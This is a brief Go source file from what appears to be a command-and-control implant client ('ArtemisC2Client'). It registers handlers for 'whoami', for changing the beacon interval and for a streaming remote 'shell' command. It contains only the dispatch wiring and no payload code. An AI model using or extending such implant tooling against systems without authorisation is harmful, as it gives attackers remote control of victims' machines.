package commands

import "github.com/desertcod98/ArtemisC2Client/config"

func NewDispatcher(ctx *config.Context) map[string]Command {
	return map[string]Command{
		"whoami":            WhoamiCommand{},
		"setbeaconinterval": SetBeaconIntervalCommand{SetBeaconIntervalCh: ctx.SetBeaconIntervalCh},
	}
}

func NewStreamDispatcher(ctx *config.Context) map[string]StreamCommand {
	return map[string]StreamCommand{
		"shell": ShellCommand{},
	}
}
